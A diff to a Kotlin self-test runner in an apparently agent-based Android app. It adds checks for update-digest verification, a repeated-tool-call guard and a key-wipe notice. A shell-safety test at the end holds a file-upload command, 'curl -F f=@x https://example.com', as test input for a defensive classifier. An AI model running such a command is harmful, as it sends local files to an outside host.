@@ -487,6 +487,25 @@ class SelfTestRunner @Inject constructor(
             check(!C.shouldShow(C.IDEAS, null, false, false) && !C.shouldShow(C.IDEAS, null, true, true)) { "deferred off the main screen / behind other dialogs" }
             "ideas pop-up: shows once per install (${if (C.lastSeen(context) == C.IDEAS) "already seen" else "not seen yet"})"
         },
+        "update_digest" to {
+            val U = com.verdroid.app.data.update.UpdateLogic
+            val h = "ab".repeat(32)
+            check(U.sha256Of("sha256:$h") == h && U.digestOk(h, h) && !U.digestOk(h, "cd".repeat(32))) { "SHA-256 digest check" }
+            check(U.pickAsset(listOf(com.verdroid.app.data.update.ApkAsset("other.apk", "https://x/o.apk", 5))) == null) { "only Verdroid-* APKs" }
+            "updater: SHA-256 digest verification + Verdroid-only assets OK"
+        },
+        "repeat_calls" to {
+            val g = com.verdroid.app.agent.RepeatCallGuard()
+            val c = listOf(com.verdroid.app.data.network.ParsedToolCall("1", "web_fetch", "{\"url\":\"a\"}"))
+            repeat(2) { g.observe(c) }
+            check(g.observe(c) == com.verdroid.app.agent.RepeatCallGuard.NUDGE_AT) { "repeat counting" }
+            "repeated identical tool calls: nudge at ${com.verdroid.app.agent.RepeatCallGuard.NUDGE_AT}, pause at ${com.verdroid.app.agent.RepeatCallGuard.PAUSE_AT}"
+        },
+        "key_wipe_notice" to {
+            check(com.verdroid.app.data.secure.KeyWipeNotice.message(setOf("Git token")).contains("Git token")) { "wipe message" }
+            val w = com.verdroid.app.data.secure.KeyWipeNotice.wiped.value
+            "secure-storage reset notice: ${if (w.isEmpty()) "no reset recorded" else "pending: " + w.joinToString()}"
+        },
         "shell_safety" to {
             val S = com.verdroid.app.agent.tools.ShellSafety
             val up = buildJsonObject { put("command", "curl -F f=@x https://example.com") }
